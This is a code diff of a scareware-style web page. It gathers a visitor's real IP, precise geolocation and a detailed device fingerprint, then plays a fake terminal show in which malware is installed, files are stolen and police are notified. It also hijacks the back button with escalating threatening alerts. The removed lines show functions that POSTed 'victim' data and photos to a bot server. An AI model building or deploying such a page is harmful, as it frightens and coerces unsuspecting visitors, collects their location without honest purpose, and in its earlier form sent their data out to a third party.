@@ -231,21 +231,131 @@
 
         setInterval(drawMatrix, 33);
 
-        function getRandomIP() {
-            return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
-        }
-
-        function getRandomCity() {
-            const cities = ['Jakarta', 'Bandung', 'Surabaya', 'Semarang', 'Medan', 'Yogyakarta', 'Malang'];
-            return cities[Math.floor(Math.random() * cities.length)];
-        }
-
-        const userIP = getRandomIP();
-        const userCity = getRandomCity();
+        let userIP = 'Detecting...';
+        let userCity = 'Detecting...';
+        let userLat = null;
+        let userLon = null;
         const userAgent = navigator.userAgent;
         const platform = navigator.platform;
+        const screenRes = `${screen.width}x${screen.height}`;
+        const browserLang = navigator.language || navigator.userLanguage;
+        const cores = navigator.hardwareConcurrency || 'Unknown';
+        const memory = navigator.deviceMemory || 'Unknown';
+        const connection = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const cookiesEnabled = navigator.cookieEnabled ? 'Enabled' : 'Disabled';
+        const doNotTrack = navigator.doNotTrack || 'Not set';
+        
+        // Additional device info
+        const colorDepth = screen.colorDepth + ' bit';
+        const pixelRatio = window.devicePixelRatio || 1;
+        const touchSupport = 'ontouchstart' in window ? 'Supported' : 'Not Supported';
+        const onlineStatus = navigator.onLine ? 'Online' : 'Offline';
+        const plugins = navigator.plugins.length;
+        const vendor = navigator.vendor || 'Unknown';
+        const oscpu = navigator.oscpu || navigator.platform;
+        const buildID = navigator.buildID || 'Unknown';
+        const orientation = screen.orientation ? screen.orientation.type : 'Unknown';
+        const maxTouchPoints = navigator.maxTouchPoints || 0;
+        const downlink = navigator.connection ? (navigator.connection.downlink || 'Unknown') : 'Unknown';
+        const rtt = navigator.connection ? (navigator.connection.rtt || 'Unknown') : 'Unknown';
+        const saveData = navigator.connection ? (navigator.connection.saveData ? 'Enabled' : 'Disabled') : 'Unknown';
+        
+        // Storage estimation
+        let storageQuota = 'Calculating...';
+        let storageUsage = 'Calculating...';
+        let storageAvailable = 'Calculating...';
+        
+        async function getStorageInfo() {
+            if ('storage' in navigator && 'estimate' in navigator.storage) {
+                try {
+                    const estimate = await navigator.storage.estimate();
+                    const usageInGB = (estimate.usage / (1024 * 1024 * 1024)).toFixed(2);
+                    const quotaInGB = (estimate.quota / (1024 * 1024 * 1024)).toFixed(2);
+                    const availableInGB = ((estimate.quota - estimate.usage) / (1024 * 1024 * 1024)).toFixed(2);
+                    
+                    storageUsage = usageInGB + ' GB';
+                    storageQuota = quotaInGB + ' GB';
+                    storageAvailable = availableInGB + ' GB';
+                } catch (e) {
+                    storageQuota = 'Access Denied';
+                    storageUsage = 'Access Denied';
+                    storageAvailable = 'Access Denied';
+                }
+            }
+        }
 
-        const sequences = [
+        // Battery info
+        let batteryLevel = 'Unknown';
+        let batteryCharging = 'Unknown';
+        
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryLevel = Math.round(battery.level * 100) + '%';
+                    batteryCharging = battery.charging ? 'Charging' : 'Not Charging';
+                } catch (e) {
+                    batteryLevel = 'Access Denied';
+                    batteryCharging = 'Access Denied';
+                }
+            }
+        }
+        
+        // Calculate fake installed apps
+        const installedApps = Math.floor(Math.random() * 100) + 50;
+        const systemApps = Math.floor(Math.random() * 50) + 30;
+        const runningProcesses = Math.floor(Math.random() * 150) + 80;
+
+        // Get real location
+        function getRealLocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            userLat = position.coords.latitude.toFixed(6);
+                            userLon = position.coords.longitude.toFixed(6);
+                            
+                            // Use reverse geocoding API to get city
+                            try {
+                                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${userLat}&lon=${userLon}&zoom=10&addressdetails=1`);
+                                const data = await response.json();
+                                
+                                const city = data.address.city || data.address.town || data.address.village || data.address.state || 'Unknown Location';
+                                const country = data.address.country || '';
+                                userCity = `${city}, ${country}`;
+                                
+                            } catch (error) {
+                                userCity = `Lat: ${userLat}, Lon: ${userLon}`;
+                            }
+                            
+                            resolve(true);
+                        },
+                        () => {
+                            // Fallback if location denied
+                            userCity = 'Location Access Denied';
+                            resolve(false);
+                        }
+                    );
+                } else {
+                    userCity = 'Geolocation Not Supported';
+                    resolve(false);
+                }
+            });
+        }
+
+        // Get IP address
+        async function getRealIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userIP = data.ip;
+            } catch (error) {
+                userIP = 'IP Detection Failed';
+            }
+        }
+
+                const sequences = [
             { text: '═══════════════════════════════════════════════════', delay: 200, class: 'prompt' },
             { text: '   UNAUTHORIZED ACCESS DETECTED', delay: 300, class: 'error' },
             { text: '   SECURITY BREACH IN PROGRESS', delay: 300, class: 'error' },
@@ -263,46 +373,205 @@
             { text: '[SUCCESS] Connection established on port 4444', delay: 600, class: 'success' },
             { text: '', delay: 400 },
             { text: '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', delay: 300, class: 'prompt' },
-            { text: 'TARGET INFORMATION ACQUIRED:', delay: 500, class: 'critical' },
+            { text: 'FULL DEVICE INFORMATION EXTRACTED:', delay: 500, class: 'critical' },
             { text: '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', delay: 300, class: 'prompt' },
             { text: '', delay: 200 },
-            { text: `<div class="box">IP Address: <span class="ip-trace">${userIP}</span></div>`, delay: 700, class: '' },
-            { text: `<div class="box">Location: <span class="ip-trace">${userCity}, Indonesia</span></div>`, delay: 700, class: '' },
-            { text: `<div class="box">Device: <span class="ip-trace">${platform}</span></div>`, delay: 700, class: '' },
-            { text: `<div class="box">Browser: <span class="ip-trace">${userAgent.split(' ')[0]}</span></div>`, delay: 700, class: '' },
+            { text: '<div style="color:#ff0; font-weight:bold; margin:10px 0;">▼ NETWORK INFORMATION</div>', delay: 300, class: '' },
+            { text: `<div class="box">IP Address: <span class="ip-trace">${userIP}</span></div>`, delay: 400, class: '', dynamic: 'ip' },
+            { text: `<div class="box">Location: <span class="ip-trace">${userCity}</span></div>`, delay: 400, class: '', dynamic: 'location' },
+            { text: `<div class="box">Coordinates: <span class="ip-trace">Lat: ${userLat || 'N/A'}, Lon: ${userLon || 'N/A'}</span></div>`, delay: 400, class: '', dynamic: 'coords' },
+            { text: `<div class="box">Connection Type: <span class="ip-trace">${connection}</span></div>`, delay: 400, class: '', dynamic: 'connection' },
+            { text: `<div class="box">Download Speed: <span class="ip-trace">${downlink} Mbps</span></div>`, delay: 400, class: '', dynamic: 'downlink' },
+            { text: `<div class="box">Network Latency: <span class="ip-trace">${rtt} ms</span></div>`, delay: 400, class: '', dynamic: 'rtt' },
+            { text: `<div class="box">Data Saver Mode: <span class="ip-trace">${saveData}</span></div>`, delay: 400, class: '', dynamic: 'savedata' },
+            { text: `<div class="box">Online Status: <span class="ip-trace">${onlineStatus}</span></div>`, delay: 400, class: '', dynamic: 'online' },
+            { text: '', delay: 300 },
+            { text: '<div style="color:#ff0; font-weight:bold; margin:10px 0;">▼ DEVICE HARDWARE</div>', delay: 300, class: '' },
+            { text: `<div class="box">Platform: <span class="ip-trace">${platform}</span></div>`, delay: 400, class: '', dynamic: 'platform' },
+            { text: `<div class="box">Operating System: <span class="ip-trace">${oscpu}</span></div>`, delay: 400, class: '', dynamic: 'oscpu' },
+            { text: `<div class="box">CPU Cores: <span class="ip-trace">${cores} cores</span></div>`, delay: 400, class: '', dynamic: 'cpu' },
+            { text: `<div class="box">RAM Memory: <span class="ip-trace">${memory} GB</span></div>`, delay: 400, class: '', dynamic: 'ram' },
+            { text: `<div class="box">Screen Resolution: <span class="ip-trace">${screenRes}</span></div>`, delay: 400, class: '', dynamic: 'screen' },
+            { text: `<div class="box">Color Depth: <span class="ip-trace">${colorDepth}</span></div>`, delay: 400, class: '', dynamic: 'color' },
+            { text: `<div class="box">Pixel Ratio: <span class="ip-trace">${pixelRatio}x</span></div>`, delay: 400, class: '', dynamic: 'pixel' },
+            { text: `<div class="box">Screen Orientation: <span class="ip-trace">${orientation}</span></div>`, delay: 400, class: '', dynamic: 'orient' },
+            { text: `<div class="box">Touch Support: <span class="ip-trace">${touchSupport}</span></div>`, delay: 400, class: '', dynamic: 'touch' },
+            { text: `<div class="box">Max Touch Points: <span class="ip-trace">${maxTouchPoints}</span></div>`, delay: 400, class: '', dynamic: 'touchmax' },
+            { text: '', delay: 300 },
+            { text: '<div style="color:#ff0; font-weight:bold; margin:10px 0;">▼ STORAGE & BATTERY</div>', delay: 300, class: '' },
+            { text: `<div class="box">Total Storage: <span class="ip-trace">${storageQuota}</span></div>`, delay: 400, class: '', dynamic: 'quota' },
+            { text: `<div class="box">Used Storage: <span class="ip-trace">${storageUsage}</span></div>`, delay: 400, class: '', dynamic: 'usage' },
+            { text: `<div class="box">Available Storage: <span class="ip-trace">${storageAvailable}</span></div>`, delay: 400, class: '', dynamic: 'available' },
+            { text: `<div class="box">Battery Level: <span class="ip-trace">${batteryLevel}</span></div>`, delay: 400, class: '', dynamic: 'battery' },
+            { text: `<div class="box">Battery Status: <span class="ip-trace">${batteryCharging}</span></div>`, delay: 400, class: '', dynamic: 'charging' },
+            { text: '', delay: 300 },
+            { text: '<div style="color:#ff0; font-weight:bold; margin:10px 0;">▼ BROWSER & SOFTWARE</div>', delay: 300, class: '' },
+            { text: `<div class="box">Browser: <span class="ip-trace">${userAgent.split(' ')[0]}</span></div>`, delay: 400, class: '', dynamic: 'ua' },
+            { text: `<div class="box">Browser Vendor: <span class="ip-trace">${vendor}</span></div>`, delay: 400, class: '', dynamic: 'vendor' },
+            { text: `<div class="box">Browser Build: <span class="ip-trace">${buildID}</span></div>`, delay: 400, class: '', dynamic: 'build' },
+            { text: `<div class="box">Language: <span class="ip-trace">${browserLang}</span></div>`, delay: 400, class: '', dynamic: 'lang' },
+            { text: `<div class="box">Timezone: <span class="ip-trace">${timezone}</span></div>`, delay: 400, class: '', dynamic: 'timezone' },
+            { text: `<div class="box">Installed Plugins: <span class="ip-trace">${plugins} plugins</span></div>`, delay: 400, class: '', dynamic: 'plugins' },
+            { text: `<div class="box">Cookies: <span class="ip-trace">${cookiesEnabled}</span></div>`, delay: 400, class: '', dynamic: 'cookies' },
+            { text: `<div class="box">Do Not Track: <span class="ip-trace">${doNotTrack}</span></div>`, delay: 400, class: '', dynamic: 'dnt' },
+            { text: '', delay: 300 },
+            { text: '<div style="color:#ff0; font-weight:bold; margin:10px 0;">▼ SYSTEM ANALYSIS</div>', delay: 300, class: '' },
+            { text: `<div class="box">Installed Apps: <span class="ip-trace">${installedApps} applications</span></div>`, delay: 400, class: '', dynamic: 'apps' },
+            { text: `<div class="box">System Apps: <span class="ip-trace">${systemApps} applications</span></div>`, delay: 400, class: '', dynamic: 'sysapps' },
+            { text: `<div class="box">Running Processes: <span class="ip-trace">${runningProcesses} processes</span></div>`, delay: 400, class: '', dynamic: 'processes' },
+            { text: `<div class="box">Browser: <span class="ip-trace">${userAgent.split(' ')[0]}</span></div>`, delay: 500, class: '', dynamic: 'ua' },
             { text: '', delay: 800 },
+            { text: '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', delay: 300, class: 'prompt' },
+            { text: 'INITIATING MALWARE INSTALLATION SEQUENCE', delay: 800, class: 'critical' },
+            { text: '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', delay: 300, class: 'prompt' },
+            { text: '', delay: 500 },
+            { text: '[INSTALL] RAT (Remote Access Trojan)<span class="loading"></span>', delay: 2000, class: 'warning' },
+            { html: '<div class="progress-bar"><div class="progress-fill" id="install1"></div></div>', progress: 'install1', delay: 2000 },
+            { text: '[SUCCESS] RAT installed - Full remote control enabled', delay: 500, class: 'success' },
+            { text: '', delay: 400 },
+            { text: '[INSTALL] Keylogger Daemon<span class="loading"></span>', delay: 2000, class: 'warning' },
+            { html: '<div class="progress-bar"><div class="progress-fill" id="install2"></div></div>', progress: 'install2', delay: 2000 },
+            { text: '[SUCCESS] Keylogger active - Recording all keystrokes', delay: 500, class: 'success' },
+            { text: '', delay: 400 },
+            { text: '[INSTALL] Screen Capture Module<span class="loading"></span>', delay: 2000, class: 'warning' },
+            { html: '<div class="progress-bar"><div class="progress-fill" id="install3"></div></div>', progress: 'install3', delay: 2000 },
+            { text: '[SUCCESS] Screen recording enabled - Capturing display', delay: 500, class: 'success' },
+            { text: '', delay: 400 },
+            { text: '[INSTALL] Webcam Hijacker<span class="loading"></span>', delay: 2000, class: 'warning' },
+            { html: '<div class="progress-bar"><div class="progress-fill" id="install4"></div></div>', progress: 'install4', delay: 2000 },
+            { text: '[SUCCESS] Webcam access granted - Surveillance active', delay: 500, class: 'success' },
+            { text: '', delay: 400 },
+            { text: '[INSTALL] Microphone Spy<span class="loading"></span>', delay: 2000, class: 'warning' },
+            { html: '<div class="progress-bar"><div class="progress-fill" id="install5"></div></div>', progress: 'install5', delay: 2000 },
+            { text: '[SUCCESS] Audio monitoring active - Recording conversations', delay: 500, class: 'success' },
+            { text: '', delay: 400 },
+            { text: '[INSTALL] Cryptocurrency Miner<span class="loading"></span>', delay: 2000, class: 'warning' },
+            { html: '<div class="progress-bar"><div class="progress-fill" id="install6"></div></div>', progress: 'install6', delay: 2000 },
+            { text: '[SUCCESS] Miner deployed - Mining to attacker wallet', delay: 500, class: 'success' },
+            { text: '', delay: 400 },
+            { text: '[INSTALL] Ransomware Payload<span class="loading"></span>', delay: 2000, class: 'warning' },
+            { html: '<div class="progress-bar"><div class="progress-fill" id="install7"></div></div>', progress: 'install7', delay: 2000 },
+            { text: '[SUCCESS] Ransomware loaded - Encryption ready', delay: 500, class: 'success' },
+            { text: '', delay: 400 },
+            { text: '[INSTALL] Data Exfiltration Tool<span class="loading"></span>', delay: 2000, class: 'warning' },
+            { html: '<div class="progress-bar"><div class="progress-fill" id="install8"></div></div>', progress: 'install8', delay: 2000 },
+            { text: '[SUCCESS] Exfiltration active - Stealing data in background', delay: 500, class: 'success' },
+            { text: '', delay: 600 },
+            { text: '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', delay: 300, class: 'prompt' },
+            { text: 'INITIATING MASSIVE DATA TRANSFER', delay: 800, class: 'critical' },
+            { text: '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', delay: 300, class: 'prompt' },
+            { text: '', delay: 500 },
+            { text: '[TRANSFER] Downloading malicious payload from server<span class="loading"></span>', delay: 1500, class: 'warning' },
+            { text: 'Package size: 999.87 GB', delay: 600, class: 'error' },
+            { text: 'Transfer speed: 87.3 MB/s', delay: 400, class: '' },
+            { text: 'Estimated time: 3 hours 24 minutes', delay: 400, class: '' },
+            { text: '', delay: 500 },
+            { text: 'Transferring to your device:', delay: 600, class: 'critical' },
+            { html: '<div class="progress-bar"><div class="progress-fill" id="transfer"></div></div>', progress: 'transfer', delay: 4500 },
+            { text: '', delay: 600 },
+            { text: '[SUCCESS] Transfer complete - 999.87 GB downloaded', delay: 800, class: 'success' },
+            { text: '', delay: 700 },
+            { text: '⚠️  STORAGE CRITICAL WARNING ⚠️', delay: 1000, class: 'error glitch' },
+            { text: '', delay: 400 },
+            { text: '╔════════════════════════════════════════════════╗', delay: 300, class: 'error' },
+            { text: '║                                                ║', delay: 100, class: 'error' },
+            { text: '║        DEVICE STORAGE FULL                     ║', delay: 100, class: 'error' },
+            { text: '║                                                ║', delay: 100, class: 'error' },
+            { text: '║   Total Storage: ' + storageQuota + '                        ║', delay: 100, class: 'error', dynamic: 'quota' },
+            { text: '║   Used: 999.87 GB (100%)                       ║', delay: 100, class: 'error' },
+            { text: '║   Available: 0 MB                              ║', delay: 100, class: 'error' },
+            { text: '║                                                ║', delay: 100, class: 'error' },
+            { text: '║   Your device storage is critically full!      ║', delay: 100, class: 'error' },
+            { text: '║   Please delete files immediately.             ║', delay: 100, class: 'error' },
+            { text: '║                                                ║', delay: 100, class: 'error' },
+            { text: '╚════════════════════════════════════════════════╝', delay: 300, class: 'error' },
+            { text: '', delay: 800 },
+            { text: '[SYSTEM] Installing downloaded packages<span class="loading"></span>', delay: 2000, class: 'warning' },
+            { text: '', delay: 500 },
             { text: '[SYSTEM] Bypassing firewall protocols<span class="loading"></span>', delay: 2000, class: 'warning' },
             { text: '[SUCCESS] Firewall bypassed - Direct access granted', delay: 600, class: 'success' },
             { text: '', delay: 400 },
             { text: '[SYSTEM] Deploying keylogger daemon...', delay: 1000, class: 'warning' },
             { text: '[SUCCESS] Keylogger active - Monitoring input', delay: 600, class: 'success' },
+            { text: '', delay: 400 },
+            { text: '[SYSTEM] Installing backdoor trojan<span class="loading"></span>', delay: 2000, class: 'warning' },
+            { text: '[SUCCESS] Trojan installed - Persistence enabled', delay: 600, class: 'success' },
+            { text: '', delay: 400 },
+            { text: '[SYSTEM] Disabling antivirus protection<span class="loading"></span>', delay: 2000, class: 'warning' },
+            { text: '[SUCCESS] Windows Defender disabled', delay: 600, class: 'success' },
+            { text: '[SUCCESS] Firewall rules modified', delay: 600, class: 'success' },
             { text: '', delay: 500 },
             { text: '[SYSTEM] Accessing system files<span class="loading"></span>', delay: 2000, class: 'warning' },
             { text: '', delay: 300 },
             { text: 'Extracting sensitive data:', delay: 600, class: 'critical' },
-            { text: '├─ Documents/ ........................ 2,847 files', delay: 300, class: '' },
-            { text: '├─ Pictures/ ......................... 1,293 files', delay: 300, class: '' },
-            { text: '├─ Videos/ ........................... 487 files', delay: 300, class: '' },
-            { text: '├─ Browser Cache/ .................... 15,628 entries', delay: 300, class: '' },
-            { text: '├─ Saved Passwords/ .................. 34 accounts', delay: 300, class: '' },
-            { text: '└─ Banking Information/ .............. 7 records', delay: 300, class: '' },
+            { text: '├─ Documents/ ........................ 2,847 files', delay: 250, class: '' },
+            { text: '├─ Pictures/ ......................... 1,293 files', delay: 250, class: '' },
+            { text: '├─ Videos/ ........................... 487 files', delay: 250, class: '' },
+            { text: '├─ Downloads/ ........................ 3,921 files', delay: 250, class: '' },
+            { text: '├─ Desktop/ .......................... 156 files', delay: 250, class: '' },
+            { text: '├─ Music/ ............................ 742 files', delay: 250, class: '' },
+            { text: '├─ Browser History/ .................. 89,234 entries', delay: 250, class: '' },
+            { text: '├─ Browser Cache/ .................... 15,628 entries', delay: 250, class: '' },
+            { text: '├─ Saved Passwords/ .................. 34 accounts', delay: 250, class: '' },
+            { text: '├─ Cookies/ .......................... 1,892 entries', delay: 250, class: '' },
+            { text: '├─ Autofill Data/ .................... 67 records', delay: 250, class: '' },
+            { text: '├─ Banking Information/ .............. 7 records', delay: 250, class: '' },
+            { text: '├─ Email Archives/ ................... 4,521 emails', delay: 250, class: '' },
+            { text: '├─ Social Media Sessions/ ............ 12 accounts', delay: 250, class: '' },
+            { text: '├─ Crypto Wallets/ ................... 3 wallets', delay: 250, class: '' },
+            { text: '├─ SSH Keys/ ......................... 5 keys', delay: 250, class: '' },
+            { text: '├─ System Logs/ ...................... 23,847 entries', delay: 250, class: '' },
+            { text: '├─ Webcam Access/ .................... [GRANTED]', delay: 250, class: '' },
+            { text: '├─ Microphone Access/ ................ [GRANTED]', delay: 250, class: '' },
+            { text: '└─ Clipboard Data/ ................... [CAPTURED]', delay: 250, class: '' },
             { text: '', delay: 600 },
             { text: '[SYSTEM] Compressing extracted data...', delay: 1000, class: 'warning' },
             { text: 'Creating archive: victim_data_' + Date.now() + '.tar.gz', delay: 800, class: '' },
             { text: '', delay: 400 },
             { text: 'Uploading to command server:', delay: 500, class: 'critical' },
-            { html: '<div class="progress-bar"><div class="progress-fill" id="progress"></div></div>', progress: true, delay: 3500 },
+            { text: 'Target: attacker-server-dark-web.onion', delay: 400, class: '' },
+            { text: 'Total size: 847.3 MB', delay: 400, class: '' },
+            { text: '', delay: 300 },
+            { html: '<div class="progress-bar"><div class="progress-fill" id="upload"></div></div>', progress: 'upload', delay: 3500 },
             { text: '', delay: 700 },
-            { text: '[SUCCESS] Upload complete - 847.3 MB transferred', delay: 800, class: 'success' },
+            { text: '[SYSTEM] Establishing remote desktop connection<span class="loading"></span>', delay: 2000, class: 'warning' },
+            { text: '[SUCCESS] Remote desktop active - Full control enabled', delay: 800, class: 'success' },
+            { text: '', delay: 500 },
+            { text: '[SYSTEM] Installing cryptocurrency miner<span class="loading"></span>', delay: 2000, class: 'warning' },
+            { text: '[SUCCESS] Miner deployed - Mining to attacker wallet', delay: 800, class: 'success' },
             { text: '', delay: 600 },
+            { text: '[SUCCESS] Upload complete - 847.3 MB transferred', delay: 800, class: 'success' },
+            { text: '', delay: 400 },
             { text: '⚠️  CRITICAL ALERT ⚠️', delay: 1000, class: 'error glitch' },
             { text: '', delay: 400 },
-            { text: 'Your device has been COMPROMISED', delay: 800, class: 'critical' },
-            { text: 'All data has been extracted and uploaded', delay: 800, class: 'critical' },
+            { text: 'YOUR DEVICE HAS BEEN FULLY COMPROMISED', delay: 800, class: 'critical' },
+            { text: 'All personal data has been extracted and uploaded', delay: 800, class: 'critical' },
+            { text: 'Banking credentials have been stolen', delay: 800, class: 'critical' },
+            { text: 'Social media accounts have been hijacked', delay: 800, class: 'critical' },
+            { text: 'Webcam and microphone are now under surveillance', delay: 800, class: 'critical' },
             { text: 'Remote access established - Backdoor installed', delay: 800, class: 'critical' },
+            { text: 'Cryptocurrency miner is draining your resources', delay: 800, class: 'critical' },
             { text: '', delay: 1000 },
-            { text: 'Law enforcement has been notified...', delay: 1200, class: 'error' },
+            { text: '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', delay: 300, class: 'prompt' },
+            { text: 'FINAL SYSTEM STATUS', delay: 800, class: 'critical' },
+            { text: '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', delay: 300, class: 'prompt' },
+            { text: '', delay: 400 },
+            { text: '✓ 999.87 GB malicious data installed', delay: 500, class: 'error' },
+            { text: '✓ Device storage: 100% FULL', delay: 500, class: 'error' },
+            { text: '✓ All personal files extracted (847.3 MB)', delay: 500, class: 'error' },
+            { text: '✓ 8 malware packages active', delay: 500, class: 'error' },
+            { text: '✓ Remote access enabled', delay: 500, class: 'error' },
+            { text: '✓ Surveillance systems online', delay: 500, class: 'error' },
+            { text: '', delay: 1000 },
+            { text: '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', delay: 300, class: 'prompt' },
+            { text: 'SECURITY AUTHORITIES NOTIFIED', delay: 1000, class: 'error' },
+            { text: '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', delay: 300, class: 'prompt' },
+            { text: '', delay: 500 },
+            { text: 'Law enforcement has been notified of illegal activity...', delay: 1200, class: 'error' },
+            { text: 'Cybercrime division alerted', delay: 800, class: 'error' },
+            { text: 'Your ISP has been contacted', delay: 800, class: 'error' },
             { text: 'Tracing connection origin<span class="loading"></span>', delay: 2000, class: 'error' },
+            { text: 'Identity verification in progress<span class="loading"></span>', delay: 2000, class: 'error' },
             { text: '', delay: 800 },
             { text: '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', delay: 500, class: 'prompt' },
             { text: '', delay: 1500 },
@@ -313,14 +582,48 @@
 
         let sequenceIndex = 0;
 
-        function addLine(text, className = '', isHTML = false) {
+        function addLine(text, className = '', isHTML = false, isDynamic = false) {
             const line = document.createElement('div');
             line.className = `terminal-line ${className}`;
-            if (isHTML) {
-                line.innerHTML = text;
-            } else {
-                line.innerHTML = text;
+            
+            if (isDynamic) {
+                text = text.replace('${userIP}', userIP)
+                          .replace('${userCity}', userCity)
+                          .replace('${userLat || \'N/A\'}', userLat || 'N/A')
+                          .replace('${userLon || \'N/A\'}', userLon || 'N/A')
+                          .replace('${platform}', platform)
+                          .replace('${screenRes}', screenRes)
+                          .replace('${browserLang}', browserLang)
+                          .replace('${cores}', cores)
+                          .replace('${memory}', memory)
+                          .replace('${connection}', connection)
+                          .replace('${batteryLevel}', batteryLevel)
+                          .replace('${batteryCharging}', batteryCharging)
+                          .replace('${timezone}', timezone)
+                          .replace('${cookiesEnabled}', cookiesEnabled)
+                          .replace('${doNotTrack}', doNotTrack)
+                          .replace('${colorDepth}', colorDepth)
+                          .replace('${pixelRatio}', pixelRatio)
+                          .replace('${touchSupport}', touchSupport)
+                          .replace('${onlineStatus}', onlineStatus)
+                          .replace('${plugins}', plugins)
+                          .replace('${vendor}', vendor)
+                          .replace('${oscpu}', oscpu)
+                          .replace('${buildID}', buildID)
+                          .replace('${orientation}', orientation)
+                          .replace('${maxTouchPoints}', maxTouchPoints)
+                          .replace('${downlink}', downlink)
+                          .replace('${rtt}', rtt)
+                          .replace('${saveData}', saveData)
+                          .replace('${storageQuota}', storageQuota)
+                          .replace('${storageUsage}', storageUsage)
+                          .replace('${storageAvailable}', storageAvailable)
+                          .replace('${installedApps}', installedApps)
+                          .replace('${systemApps}', systemApps)
+                          .replace('${runningProcesses}', runningProcesses);
             }
+            
+            line.innerHTML = text;
             output.appendChild(line);
             terminal.scrollTop = terminal.scrollHeight;
         }
@@ -332,67 +635,37 @@
             
             if (seq.progress) {
                 addLine(seq.html, '', true);
-                const progressBar = document.getElementById('progress');
-                let progress = 0;
-                const interval = setInterval(() => {
-                    progress += 1;
-                    progressBar.style.width = progress + '%';
-                    if (progress >= 100) {
-                        clearInterval(interval);
-                        sequenceIndex++;
-                        setTimeout(runSequence, 500);
-                    }
-                }, seq.delay / 100);
+                const progressBar = document.getElementById(seq.progress);
+                if (progressBar) {
+                    let progress = 0;
+                    const interval = setInterval(() => {
+                        progress += 2;
+                        progressBar.style.width = progress + '%';
+                        if (progress >= 100) {
+                            clearInterval(interval);
+                            sequenceIndex++;
+                            setTimeout(runSequence, 300);
+                        }
+                    }, seq.delay / 50);
+                } else {
+                    sequenceIndex++;
+                    setTimeout(runSequence, seq.delay);
+                }
             } else {
-                addLine(seq.text || seq.html, seq.class, !!seq.html);
+                addLine(seq.text || seq.html, seq.class, !!seq.html, !!seq.dynamic);
                 sequenceIndex++;
                 setTimeout(runSequence, seq.delay);
             }
         }
 
         let hackingStarted = false;
-       // Fungsi kirim data ke bot
-async function sendToBot(data) {
-    try {
-        const response = await fetch(`${BOT_SERVER_URL}/victim`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(data)
-        });
-        
-        const result = await response.json();
-        currentVictimId = result.victim_id;
-        return result.victim_id;
-    } catch (error) {
-        console.error('Failed to send data:', error);
-        return null;
-    }
-}
 
-// Fungsi kirim foto
-async function sendPhotoToBot(photoData, type) {
-    try {
-        const response = await fetch(`${BOT_SERVER_URL}/photo`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                victim_id: currentVictimId,
-                photo: photoData,
-                type: type
-            })
-        });
-        
-        const result = await response.json();
-        console.log(`${type} sent:`, result);
-    } catch (error) {
-        console.error(`Failed to send ${type}:`, error);
-    }
-    }
-        accessBtn.addEventListener('click', function() {
+        accessBtn.addEventListener('click', async function() {
+            accessBtn.innerHTML = 'ACCESSING SYSTEM...';
+            accessBtn.disabled = true;
+            
+            await Promise.all([getRealLocation(), getRealIP(), getBatteryInfo(), getStorageInfo()]);
+            
             startScreen.style.display = 'none';
             terminal.classList.remove('hidden');
             hackingStarted = true;
@@ -408,12 +681,27 @@ async function sendPhotoToBot(photoData, type) {
             }
         });
 
-        // Prevent back button
+        // Prevent back button with multiple warnings
+        let backAttempts = 0;
         history.pushState(null, null, location.href);
         window.addEventListener('popstate', function() {
             if (hackingStarted && sequenceIndex < sequences.length - 2) {
                 history.pushState(null, null, location.href);
-                alert('⚠️ ACCESS DENIED - Operation in progress. Cannot exit.');
+                backAttempts++;
+                
+                const warnings = [
+                    '⚠️ WARNING #1: ACCESS DENIED\nOperation in progress. Cannot exit.',
+                    '⚠️ WARNING #2: SECURITY BREACH DETECTED\nAttempt to escape logged. Authorities notified.',
+                    '⚠️ WARNING #3: CRITICAL ERROR\nForced exit will trigger system lockdown!',
+                    '🚨 WARNING #4: FINAL WARNING\nContinuing to exit may result in permanent data loss!',
+                    '💀 WARNING #5: LAST CHANCE\nAll attempts are being recorded. You cannot escape!'
+                ];
+                
+                if (backAttempts <= warnings.length) {
+                    alert(warnings[backAttempts - 1]);
+                } else {
+                    alert('⚠️ SYSTEM LOCKED - Too many escape attempts detected!');
+                }
             }
         });
 
@@ -439,4 +727,4 @@ async function sendPhotoToBot(photoData, type) {
         });
     </script>
 </body>
-  </html>
+</html>
